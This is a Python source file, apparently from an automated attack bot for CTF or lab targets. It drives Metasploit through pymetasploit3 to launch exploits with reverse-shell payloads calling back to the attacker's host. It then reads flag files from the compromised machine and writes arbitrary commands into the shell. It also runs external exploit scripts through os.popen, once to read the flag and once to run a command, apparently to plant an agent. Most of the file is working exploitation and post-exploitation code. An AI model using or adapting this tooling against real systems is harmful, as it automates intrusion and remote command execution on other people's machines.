
from pymetasploit3.msfrpc import MsfRpcClient
import socket
import json
import time
import os
import subprocess
import logging
from others import color

# log
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.FileHandler(os.path.basename(__file__)[:-3]+".log", mode='a')
formatter = logging.Formatter("%(asctime)s -  %(levelname)s - %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
# log

class VULNERIABLITY:
    def __init__(self,vul_info) -> None:
        self.vul_name=vul_info['name']
        self.vul_port=vul_info['port']
        self.vul_service=vul_info['service']
        self.vul_exp=vul_info['exp_id']
        self.vul_os=vul_info['OS']
        self.vul_CVSS_score=vul_info['CVSS_score']
        self.vul_consequence=vul_info['consequence']
        self.vul_access=vul_info['access']
        self.vul_AV=vul_info['attack_vector']
        self.color=color()
        with open("/home/kali/HFBOT/HFBOT/utils/Attack/tools/vul_tools.json", 'r') as f: #*********
            self.vulhub = json.loads(f.read())
    def print_color(self,s,c='\033[92m'):
        self.color.print_color(s,c)
    def start_exp(self,client,host_ip,target,command):
        '''
        选择msf & 编写exp的攻�?
        '''
        #假如未录入tools/exp，则id�?*，直接返�?
        if self.vul_exp=='*':
            logger.info(self.vul_name+'漏洞exp未录�?')
            return 0
        else:
            exp_id=int(self.vul_exp)

        vul=self.vulhub["vuls"][exp_id]
        exp=vul['exptools']
        self.print_color('开始利用漏�? '+self.vul_name,self.color.UNDERLINE)
        if exp['msf']:
            logger.info('start using msf tools')
            result=self.msf_attack(client,vul,host_ip,target,command)
        else:
            logger.info('start using python exp tools')
            result=self.python_attack(vul,target,command)
        
        return result
    def python_attack(self,vul,target,command):
        flag=''
        target_ip=target.host_ip
        target_os=target.host_os
        exp=vul['exptools']
        address=exp['address']
        parameters=exp['parameters']
        parameters=parameters.replace('ip',target_ip)
        parameters=parameters.replace('port',self.vul_port)
        ##先打一遍读flag
        if 'Windows' in target_os:
            ReadFlag = 'more '+r'C:\Users\Administrator\Desktop\flag.txt'
        else:
            ReadFlag = r'cat \flag'
        parameters=parameters.replace('command',ReadFlag)
        str="python3 "+address+' '+parameters
        process = os.popen(str) # return file
        flag = process.read()
        #再打一遍传agent
        parameters=parameters.replace('command',command)
        str="python3 "+address+' '+parameters
        
        process = os.popen(str) # return file
        output = process.read()
        if exp.__contains__('error_str'):##是否存在error_str
            if output.find(exp['error_str'])!=-1:
                return 0,flag
        logger.info('running '+str)
        self.print_color(output)
        #logger.info(output)
        process.close()
        return 1,flag
    def msf_attack(self,client,vul,host_ip,target,command):

        '''
        启动msf执行一个攻击操�?
        输入�?
            vul:漏洞
            host_ip:本地ip
            target_ip：目标ip
            port:目标端口
            os:目标操作系统
        输出�?
            0：运行错�?
            shell_id：成功拿到shell，返回shell id
            
        '''
        '''
        # Get targets
        exploit.targets
        # >>> {0: 'Automatic'}

        # Set the target
        exploit.target = 0

        # Get target-compatible payloads
        exploit.targetpayloads()
        '''
        flag=''
        target_ip=target.host_ip
        exp=vul["exptools"]
        exp_address=exp["address"]
        exp_payload=exp["payload"]
        
        ##搜索msf
        cid = client.consoles.console().cid
        client.consoles.console(cid).write('search '+self.vul_name)
        info=client.consoles.console(cid).read()
        search_info=info['data']
        #logger.info(search_info)
        client.consoles.console(cid).destroy
        #No results from search
        if search_info.rfind('No results from search')>0:
            logger.info('no vul')
            return 0
        else:
            logger.info('start exploiting '+self.vul_name)
            exploit = client.modules.use('exploit', exp_address)
            ps=exploit.targetpayloads()
            if exp_payload not in ps:
                logger.info('payload error')
                return 0
            targets=exploit.targets####目标的匹配，后期需要用操作系统
            exploit['RHOSTS']=target_ip
            ####msf参数赋�?
            # if "parameters" in exp["parameters"].keys():
            #     for paras in exp["parameters"].keys():
            #         if paras=='RPORT':
            #             if exp["parameters"]['RPORT']!=self.port:
            #                 exp["parameters"]['RPORT']=self.port
            #         else:
            #             exploit[paras]=exp["parameters"][paras]
                
            # exploit['LHOST']='192.168.192.158'
            # exploit['LPORT']='5555'
            missing_required=exploit.missing_required
            if missing_required:
                logger.info(missing_required)
                logger.info("msf missing required")
                #return 0
            #p=exploit.targetpayloads(exploit.targets)
            payload = client.modules.use('payload', exp_payload)
            payload['LHOST']=host_ip
            l_port=6789
            payload['LPORT']=str(l_port+1)###端口占用了怎么�?
            time.sleep(3)
            out=exploit.execute(payload=payload)
            #logger.info(out['job_id'])
            # cid = client.consoles.console().cid
            # out=client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
            # # cid = client.consoles.console().cid
            # # client.consoles.console(cid).run_module_with_output(exploit, payload='linux/x64/meterpreter/reverse_tcp')
            # client.consoles.console(cid).destroy
            # Find all available sessions      
            time.sleep(10)
            session_list = client.sessions.list
            time.sleep(10)
            logger.info(session_list)
            time.sleep(3)
            if len(client.sessions.list)==0:
                logger.info("no sessions")
                return 0,flag
            else:
                if len(session_list)==0 and len(client.sessions.list)!=0:
                    session_list=client.sessions.list
                s=session_list.keys()
                shell_id=list(s)[-1]              
                time.sleep(3)
            try:    
                shell  = client.sessions.session(str(shell_id))
            except:
                logger.info('BSoD')
                return 0,flag
            #shell.write("execute -f cmd.exe -i")
            if (len(client.sessions.list)!=0):
                shell.write(r'cat C:\\Users\\win7\\Desktop\\flag.txt')
                time.sleep(3)
                flag=shell.read()
                time.sleep(1)
                logger.info(flag)
                shell.write('shell')
            else:
                logger.info("BSoD")
                return 0,flag
            #shell.write("whoami")
            #out=shell.read()
            #out1=shell.run_with_output("execute -f cmd.exe -i")
            #out1=shell.run_with_output(command)
            time.sleep(3)
            #shell.run_shell_cmd_with_output(command)
            if (len(client.sessions.list)!=0):
                shell.write(command)
            else:
                logger.info("BSoD")
                return 0,flag
            
            
            time.sleep(2)
            return 1,flag
            # out=shell.read()
            # if out.find("Operation failed")>0:
            #     logger.info('no flag')
            #     #shell.stop()    
            # else:
            #     flag=out
            #     self.print_color(flag)
            #     shell.stop()
            #     return 1
            # Write to a session
            # client.sessions.session('1').write('help')

            # # Read a session
            # client.sessions.session('1').read()
            # # >>> '\nCore Commands\n=============\n\n    Command                   Description\n    ------- [...]'

            # # Run a command and wait for the output
            # client.sessions.session('1').run_with_output('arp')
            # # >>> '\nArp stuff'

            # # Run a shell command within a meterpreter session
            # client.sessions.session('1').run_shell_cmd_with_output('whoami')